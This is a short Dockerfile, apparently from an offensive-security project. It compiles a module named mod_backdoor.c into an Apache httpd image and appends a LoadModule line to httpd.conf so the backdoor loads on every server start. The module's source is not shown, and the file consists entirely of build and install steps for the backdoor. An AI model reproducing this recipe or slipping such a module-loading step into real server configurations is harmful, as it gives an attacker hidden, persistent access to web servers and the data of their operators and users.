FROM httpd:2.4 AS builder
RUN apt update \
    && apt install -y apache2-dev \
    && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY . .
RUN apxs -i -a -c mod_backdoor.c

FROM httpd:2.4
COPY --from=builder /usr/local/apache2/modules/mod_backdoor.so /usr/local/apache2/modules/mod_backdoor.so
RUN echo "LoadModule backdoor_module /usr/local/apache2/modules/mod_backdoor.so" >> /usr/local/apache2/conf/httpd.conf
